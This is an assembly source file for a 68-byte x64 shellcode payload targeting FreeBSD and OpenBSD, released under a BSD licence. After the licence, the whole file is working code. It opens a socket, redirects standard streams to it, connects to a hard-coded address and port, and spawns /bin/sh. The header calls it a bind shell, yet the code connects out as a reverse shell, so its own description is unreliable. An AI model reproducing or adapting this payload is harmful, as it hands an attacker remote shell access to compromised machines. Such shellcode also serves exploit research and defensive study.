;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 68 byte bind shell
; x64 versions of freebsd + openbsd
; odzhan

    bits    64
    
    mov     rax, ~0x0100007fd2040200
    not     rax
    push    rax
    push    rsp
    
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    97
    pop     rax              ; rax = sys_socket
    push    1
    pop     rsi              ; rsi = SOCK_STREAM
    push    2
    pop     rdi              ; rdi = AF_INET  
    cdq                      ; rdx = IPPROTO_IP    
    syscall
    
    xchg    eax, edi         ; edi = s, eax = 2
    xchg    eax, esi         ; esi = 2, eax = 1
    
    ; step 2, assign socket handle to stdin,stdout,stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)
dup_loop64:
    mov     al, 90           ; rax = sys_dup2
    syscall
    sub     esi, 1
    jns     dup_loop64       ; jump if not signed
    
    ; step 3, connect to remote host
    ; connect (s, &sa, sizeof(sa));
    pop     rsi              ; rsi = &sa
    mov     dl, 16           ; rdx = sizeof(sa)
    mov     al, 98           ; rax = sys_connect
    syscall    
    
    ; step 4, execute /bin/sh
    ; execve("/bin//sh", {"/bin//sh", NULL}, NULL);
    cdq                      ; rdx = 0
    mov     rbx, '/bin//sh'  ; 
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; "/bin//sh", 0
    ; ---------
    push    rdx              ; argv[1] = NULL
    push    rdi              ; argv[0] = "/bin//sh", 0
    push    rsp
    pop     rsi              ; rsi = argv
    ; ---------
    mov     al, 59           ; rax = sys_execve
    syscall
    
    
